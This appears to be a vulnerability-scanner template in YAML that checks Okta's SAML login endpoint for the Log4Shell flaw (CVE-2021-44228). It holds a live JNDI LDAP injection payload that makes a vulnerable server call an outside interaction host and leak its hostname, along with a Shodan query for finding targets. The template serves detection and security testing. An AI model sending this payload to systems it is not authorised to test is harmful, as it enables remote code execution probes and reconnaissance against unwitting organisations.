http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET /login/SAML?=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: okta-log4j-rce
info:
  author: shaikhyaser
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Okta is susceptible to Log4j JNDI remote code execution. Okta provides
    cloud software that helps companies manage and secure user authentication into
    applications, and for developers to build identity controls into applications,
    website web services and devices.

    '
  metadata:
    max-request: 1
    shodan-query: title:"Okta"
  name: Okta - Remote Code Execution (Apache Log4j)
  reference:
  - https://sec.okta.com/articles/2021/12/log4shell
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,okta,oast,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
  str: '{{rand_base(5)}}'
